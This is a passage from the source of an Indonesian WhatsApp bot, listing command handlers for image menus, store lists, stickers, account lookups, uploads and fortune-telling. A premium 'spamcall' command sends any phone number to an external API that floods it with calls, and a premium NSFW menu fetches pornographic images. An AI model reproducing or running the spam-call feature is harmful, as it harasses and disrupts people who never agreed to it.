conn.sendMessage(from, { image: { url: `https://api.zeeoneofc.xyz/api/photooxy/${command}?text=${q4}&text2=${q5}&apikey=${setting.zeeonekey}` }, caption: `Nih Logo nya ${command}🖼️` }, { quoted: msg})
}
break 

//»»————- ★ EPHOTO MENU ★ ————-««
case 'youtubegold':case 'youtubesilver':case 'facebookgold':case 'facebooksilver':case 'instagramgold':case 'instagramsilver':case 'twittergold':case 'twittersilver':case 'retrotext':case 'halloweenbats':case 'texthalloween':case 'cardhalloween':case 'birthdaycake':case 'thundertext':case 'icetext':case 'milkcake':case 'snowontext':case 'metalstar':case 'dragonfire':case 'zombie3d':case 'merrycard':case 'generalexam': case 'viettel':case 'embroider':case 'graffititext':case 'graffititext2':case 'graffititext3':case 'covergraffiti':case 'moderngold':case 'capercut':case 'lovecard':case 'heartflashlight':case 'heartcup':case 'sunglightshadow':case 'graffiti3d':case 'moderngoldsilver':case 'moderngold2':case 'modengold3':case 'fabrictext':case 'masteryavatar':case 'messagecoffee':case 'announofwin':case 'writeblood':case 'horrorletter':case 'writehorror':case 'shirtclub':case 'angelwing':case 'christmasseason':case 'projectyasuo':case 'lovelycute':case 'womansday':case 'covergamepubg':case 'nameonheart':case 'funnyhalloween':case 'lightningpubg':case 'greetingcardvideo': case 'christmascard': case 'galaxybat':case 'writegalaxy':case 'starsnight':case 'noeltext':case 'textcakes':case 'pubgbirthday':case 'galaxywallpaper':case 'pubgglicthvideo': case 'pubgmascotlogo':case 'realembroidery':case 'vintagetelevision':case 'funnyanimations':case 'glowingtext':case 'textonglass':case 'cartoonstyle':case 'multicolor':case 'watercolor2':case 'textsky':case 'summerbeach':case '1917text':case 'puppycute':case 'rosebirthday':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`_Contoh_\n${prefix+command} Ramaa`)
reply(mess.wait)
let amu =`https://api.zeeoneofc.xyz/api/ephoto360/${command}?text=${q}&apikey=${setting.zeeonekey}`
conn.sendMessage(from, {image: { url: amu }, caption: `Hasil dari ${command}`}, { quoted: msg})
}
break

//»»————- ★ RANDOM MENU ★ ————-««
case 'boneka': case 'cecan': case 'cogan': case 'darkjokes': 
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
const x35  = JSON.parse(fs.readFileSync(`./lib/Random_IMAGE/${command}.json`)); 
const x36 = x35[Math.floor(Math.random() * (x35.length))]
conn.sendMessage(from, {image:{url:x36}, caption:"Done!", mentions:[sender]},{quoted:msg})
break

case 'chika': case 'rikagusriani':  case 'bocil': case 'geayubi': case 'santuy': case 'ukhty': case 'asupan':  case 'delvira': case 'ayu': case 'bunga': case 'aura': case 'nisa': case 'ziva': case 'yana': case 'viona': case 'syania': case 'riri': case 'syifa': case 'mama_gina': case 'alcakenya': case 'mangayutri': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
reply(mess.wait)
let asupan = await (`https://api.zeeoneofc.xyz/api/asupan/${command}?apikey=${setting.zeeonekey}`)
conn.sendMessage(from, {video :{url: asupan}, caption:"Done!", mentions:[sender]}, {quoted:msg})
}
break
//»»————- ★ NSFW MENU ★ ————-««
case '.':case 'smug':case 'neko_sfw':case 'hentai_gif':case 'spank':case 'blowjob':case 'cumarts':case 'eroyuri':case 'eroneko':case 'erokemonomimi':case 'erokitsune':case 'ero':case 'feet':case 'erofeet':case 'feetgif':case 'femdom':case 'futanari':case 'hentai':case 'holoero':case 'holo':case 'keta':case 'kitsune':case 'kemonomimi':case 'pussyart':case 'pussywankgif':case 'girl_solo':case 'girl_solo_gif':case 'tits':case 'trap':case 'yuri':case 'avatar2':case 'anal':case 'bj':case 'boobs':case 'classic':case 'cumsluts':case 'kuni':case 'lesbian':case 'neko':case 'neko_gif':case 'ahegao':case 'bdsm':case 'cuckold':case 'cum':case 'foot':case 'gangbang':case 'glasses':case 'jahy':case 'masturbation':case 'nsfw_neko':case 'orgy':case 'panties':case 'tentacles':case 'thighs':case 'zettai':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
reply('*Proses...*, Dasar Mesum😆')
conn.sendMessage(from, { image: { url: `https://api.zeeoneofc.xyz/api/nsfw/${command}?apikey=${setting.zeeonekey}`}, caption: `Nih ${command}📸` }, { quoted: msg })
}
break

// »»————- ★ STORE MENU ★ ————-««
case 'shop': case 'list':
if (!isGroup) return reply(mess.OnlyGrup)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
var listMsg = {
text: `Hai @${sender.split("@")[0]}`,
buttonText: 'click here',
footer: `*list from ${groupName}*`,
mentions: [sender],
sections: [{
title: groupName, rows: arr_rows
}]
}
conn.sendMessage(from, listMsg)
break
case 'addlist':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil menambah List menu : *${args1}*`)
break
case 'dellist':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: `#hapuslist ${x.key}`
})
}
}
var listMsg = {
text: `Hai @${sender.split("@")[0]}`,
buttonText: 'pilih disini',
footer: 'Silahkan pilih list yg mau dihapus',
mentions: [sender],
sections: [{
title: groupName, rows: arr_rows
}]
}
conn.sendMessage(from, listMsg)
}
break
case 'hapuslist':
delResponList(from, q, db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
case 'update':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara #${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
updateResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil update List menu : *${args1}*`)
break
case 'tambah':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one + nilai_two}`)
break
case 'kurang':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one - nilai_two}`)
break
case 'kali':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one * nilai_two}`)
break
case 'bagi':
if (!q) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one / nilai_two}`)
break
case 'p': case 'proses':{
if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
if (!quotedMsg) return reply('Reply pesanannya!')
mentions(`「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan : ${quotedMsg.chats}\n\nPesanan @${quotedMsg.sender.split("@")[0]} sedang di proses!`, [sender])
}
break
case 'd': case 'done':{
if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
if (!quotedMsg) return reply('Reply pesanannya!')
mentions(`「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih @${quotedMsg.sender.split("@")[0]} Next Order ya??`, [sender])
}
break

// »»————- ★ PREMIUM MENU ★ ————-««
case 'jadibot': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (isGroup) return reply('Gunakan bot di privat chat')
jadibot(conn, msg, from)
}
break
case 'listjadibot':
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (isGroup) return reply('Gunakan bot di privat chat')
try {
let user = [... new Set([...global.conns.filter(conn => conn.user).map(conn => conn.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
let y = await conn.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
conn.sendMessage(from,{text:te,mentions: [y], },{quoted:msg})
} catch (err) {
reply(`Belum Ada User Yang Jadibot`)
}
break
case 'spamcall':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Kirim perintah\n#${command} nomor\n\nContoh? #${command} 8xxxx\nNomor awal dari 8 bukan 62/08`)
var data = await fetchJson(`https://arugaz.herokuapp.com/api/spamcall?no=${q}`).catch(() => reply(mess.error.api))
if (data.status == false) {
reply(data.msg)
} else {
reply(data.logs)
}
}
break
case 'simi':
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`*Contoh* : ${prefix+command} Halo`)
fetchJson(`https://api.simsimi.net/v2/?text=${q}&lc=id`)
.then(balasSimi => {reply(balasSimi.success)})
break
case 'addprem':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('*Contoh:*\n#addprem _@tag_')
if (mentionUser.length !== 0) {
number = mentionUser[0]
if (cekUser("id", number) == null) return reply('User tersebut tidak terdaftar di database\nSuruh dia verify dulu')
if (cekUser("premium", number) == true) return reply('User tersebut sudah premium')
setUser("±premium", number, true)
reply(`*PREMIUM*\n*ID:* @${number.split('@')[0]}\n*Status:* aktif`)
} else {
if (!q) return reply('*Contoh:*\n#addprem 628xxx')
var number_one = q+'@s.whatsapp.net'
if (cekUser("id", number_one) == null) return reply('User tersebut tidak terdaftar di database\n*Contoh:* 628xxxx')
if (cekUser("premium", number_one) == true) return reply('User tersebut sudah premium')
setUser("±premium", number_one, true)
reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* aktif`)
}
}
break
case 'delprem':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('*Contoh:*\n#delprem _@tag_')
if (mentionUser.length !== 0) {
number = mentionUser[0]
if (cekUser("premium", number) == false) return reply('User tersebut sudah premium')
setUser("±premium", number, false)
reply(`*PREMIUM*\n*ID:* @${number.split('@')[0]}\n*Status:* tidak`)
} else {
if (!q) return reply('*Contoh:*\n#delprem 628xxx')
var number_one = q+'@s.whatsapp.net'
if (cekUser("id", number_one) == null) return reply('User tersebut tidak terdaftar di database')
if (cekUser("premium", number_one) == false) return reply('User tersebut tidak premium')
setUser("±premium", number_one, false)
reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* tidak`)
}
}
break
case 'unblock':{
if (!isOwner && !fromMe) return reply(mess.owner)
if (!q) return reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Unblock\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await conn.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "unblock") // Unblock user
reply('Sukses Unblock Nomor')
}
break
case 'block':{
if (!isOwner && !fromMe) return reply(mess.owner)
if (!q) return reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Block\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await conn.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "block") // Block user
reply('Sukses Block Nomor')
}
break
case 'creategc':
case 'creategroup':
case 'buatgroup':
if (!isOwner) return reply(mess.OnlyOwer)
if (!q) return reply(`*Cara*\n${prefix+command} Nama Group\n\nContoh :\n${prefix+command} Toko Rama`)
var nama_nya = q
let cret = await conn.groupCreate(nama_nya, [])
let response = await conn.groupInviteCode(cret.id)
var teks_creategc = `「 *Create Group??* 」
_*Name :* ${cret.subject}_ 📛
_*Owner :* @${cret.owner.split("@")[0]}_ 🤴
_*Tanggal :* ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY")}_ 📅
_*Jam :* ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("HH:mm:ss")} WIB_ ⏰

*LINK GROUP* :
https://chat.whatsapp.com/${response}`
reply(teks_creategc)
break
//»»————- ★ CONVERT MENU ★ ————-««
case 'sticker': case 's': case 'stiker':
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (isImage || isQuotedImage){
await conn.downloadAndSaveMediaMessage(msg, "image", `./sticker/${sender.split("@")[0]}.jpeg`)
let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.jpeg`)
reply(mess.wait)
var rand1 = 'sticker/'+getRandom('.jpeg')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
fs.unlinkSync(`./${rand1}`)
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.jpeg`)
fs.unlinkSync(`./${rand2}`)})}).addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"]).toFormat('webp').save(`${rand2}`)
} else {
reply(`Kirim gambar dengan caption ${prefix+command} atau balas gambar yang sudah dikirim`)
}
break
case 'toimg':
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, "sticker", `./database/${sender.split("@")[0]}.webp`)
let buffer = fs.readFileSync(`./database/${sender.split("@")[0]}.webp`)
let buffer2 = `./database/${sender.split("@")[0]}.webp`
var rand1 = 'database/'+getRandom('.webp')
var rand2 = 'database/'+getRandom('.png')
fs.writeFileSync(`./${rand1}`, buffer)
exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
fs.unlinkSync(`./${rand1}`)
if (err) return reply(mess.error.api)
conn.sendMessage(from, {caption: `*Sticker Auto Convert!*`, image: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
fs.unlinkSync(`./${rand2}`)
fs.unlinkSync(`./database/${sender.split("@")[0]}.webp`)
})
} else {
reply(`Reply sticker dengan pesan ${prefix+command}`)
}
break
case 'nulis':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`Ex : ${prefix+command} Teks nya\n\nContoh :\n${prefix+command} RamaOfc`)
reply("```Prosess⌛```\nDasar pemalas Sukanya nyuruh² bot🤨")
var tulisan = q
var splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
var fixHeight = splitText.split('\n').slice(0, 31).join('\n')
spawn('convert', ['./sticker/nulis/buku/buku_sebelum.jpg','-font','./sticker/nulis/font/Indie-Flower.ttf','-size','960x1280','-pointsize','23','-interline-spacing','2','-annotate','+128+129',fixHeight,'./sticker/nulis/buku/buku_sesudah.jpg'])
.on('error', () => reply('error'))
conn.sendMessage(from, { image: fs.readFileSync('./sticker/nulis/buku/buku_sesudah.jpg'), caption: `Jangan Malas Kak...`})
}
break
case 'npmstalk':{
if (!q) return reply(`Kirim perintah ${prefix+command} Username\nContoh: ${prefix+command} hikki-me`)
var pack = q
npmstalk(pack).then(i=>{
reply(`*STALKER-NPM*
name; ${i.name}
versionLatest; ${i.versionLatest}
versionUpdate; ${i.versionUpdate}
latestDependencies; ${i.latestDependencies}
publishDependencies; ${i.publishDependencies}
publishTime; ${i.publishTime}
latestPublishTime; ${i.latestPublishTime}`)
}).catch((err) => {
reply('Terjadi Kesalahan!!\nNama package npm tidak ditemukan')
})
}
break
case 'ffstalk':{
if (!q) return reply(`Kirim perintah ${prefix+command} id\nContoh: ${prefix+command} 2023873618`)
var pack = q
stalkff(pack).then(i=>{
if (i.status !== 200) return reply('Terjadi Kesalahan!!\nid ff tidak ditemukan')
reply(`*STALKER FF*
ID: ${i.id}
Nickname: ${i.nickname}`)
})
}
break
case 'mlstalk':{
if (!q) return reply(`Kirim perintah ${prefix+command} id|zone\nContoh: ${prefix+command} 106281329|2228`)
var id = q.split('|')[0]
var zon = q.split('|')[1]
if (!id) return reply('ID wajib di isi')
if (!zon) return reply('ZoneID wajib di isi')
stalkml(id, zon).then(i=>{
if (i.status !== 200) return reply('Terjadi Kesalahan!!\nid/zone tidak ditemukan')
reply(`*STALKER ML*
ID: ${id}
Zone: ${zon}
Nickname: ${i.nickname}`)
})
}
break
case 'githubstalk':{
if (!q) return reply(`Kirim perintah ${prefix+command} username\nContoh: ${prefix+command} Rama`)
var user = q
fetchJson('https://api.github.com/users/'+user).then(i=>{
if (i.message) return reply('Terjadi Kesalahan!!\nUsername github tidak ditemukan')
reply(`*STALKER GITHUB*
login: ${i.login}
type: ${i.type}
name: ${i.name}
company: ${i.company}
blog: ${i.blog}
location: ${i.location}
bio: ${i.bio}
public_repos: ${i.public_repos}
public_gists: ${i.public_gists}
followers: ${i.followers}
following: ${i.following}
created_at: ${i.created_at}
updated_at: ${i.updated_at}`)
})
}
break
case 'tourl':{
if (isImage || isQuotedImage) {
reply(mess.wait)
let media = await downloadAndSaveMediaMessage('image', `./sticker/${sender}`)
let tph = await TelegraPh(media)
reply(tph)
} else if (isVideo || isQuotedVideo) {
reply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
let tph = await TelegraPh(media)
reply(tph)
} else {
reply(`Kirim/reply gambar/video dengan caption *${prefix+command}*`)
}
}
break
 case 'upload':
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${sender.split("@")[0]}.webp`)
reply(mess.wait)
let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.webp`)
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Sticker`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.webp`)
fs.unlinkSync(rand2)
} else if (isVideo || isQuotedVideo){
await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
reply(mess.wait)
let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
var rand2 = 'sticker/'+getRandom('.mp4')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Video`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp4`)
fs.unlinkSync(rand2)
} else if (isImage || isQuotedImage){
var mediany = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split("@")[0]}.jpg`)
reply(mess.wait)
let buffer_up = fs.readFileSync(mediany)
var rand2 = 'sticker/'+getRandom('.png')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Image`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(mediany)
fs.unlinkSync(rand2)
} else if (isQuotedAudio){
await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${sender.split("@")[0]}.mp3`)
reply(mess.wait)
let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp3`)
var rand2 = 'sticker/'+getRandom('.mp3')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Audio`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp3`)
fs.unlinkSync(rand2)
} else {
reply(`*reply audio/video/sticker/gambar dengan pesan ${prefix+command}*`)
}
break
//PRIMBON MENU
case 'artinama':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`Example :\n${prefix+command} Rama`)
let anu = await primbon.arti_nama(q)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama :* ${q}\n> *Arti :* ${anu.message.arti}`)
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
 if (!q) return reply( `Example :\n${prefix+command} Dikejar ular`)
let anu = await primbon.tafsir_mimpi(q)
if (anu.status == false) return m.reply(anu.message)
reply(`> *Mimpi :* ${anu.message.mimpi}\n> *Arti :* ${anu.message.arti}\n> *Solusi :* ${anu.message.solusi}`)
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply( `*Contoh :* ${prefix+command} cowo, Tgl, bln, thn, Cewe, Tgl, bln, thn\n\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Cowo :* ${anu.message.nama_anda.nama}\n> *Tinggal lahir Cowo :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Cewe :* ${anu.message.nama_pasangan.nama}\n> *Tanggal lahir Cewe :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'kecocokannama': case 'cocoknama': case 'ceknama': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`Example :\n${prefix+command} yanto|yanti`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Anda :* ${anu.message.nama_anda}\n> *Nama Pasangan :* ${anu.message.nama_pasangan}\n> *Sisi Positif :* ${anu.message.sisi_positif}\n> *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
case 'ramalancinta': case 'ramalcinta': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`Example :\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Sisi Positif :* ${anu.message.sisi_positif}\n> *Sisi Negatif :* ${anu.message.sisi_negatif}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'suamiistri': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
